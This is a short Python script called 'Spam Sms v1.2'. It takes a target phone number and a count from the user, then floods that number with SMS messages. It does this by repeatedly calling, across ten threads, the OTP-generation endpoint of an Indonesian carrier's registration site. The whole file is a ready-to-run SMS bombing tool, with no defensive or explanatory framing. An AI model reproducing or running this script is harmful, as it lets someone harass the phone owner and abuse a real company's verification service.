#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by R.Raihan
"""
This App Decode By R.Raihan.
Original Coder KANG-NEWBIE.
"""
from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

banner=("""\033[1;36m
        
           \033[1;32mSpam Sms v1.2\033[1;36m
            
           \033[1;31mContact=>https://m.facebook.com/foul.adnan\033[1;36m
           \033[1;31mGithub=>https://github.com/raihan992
""")

os.system('clear')
print(banner)
no = input("\033[1;37mInput Target Number With Countrycode =>\033[1;32m")
tot = int(input("\033[1;37mHow Many Sms To Send =>\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] Done")
		else:
			print("\033[1;31m[-] Failed")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
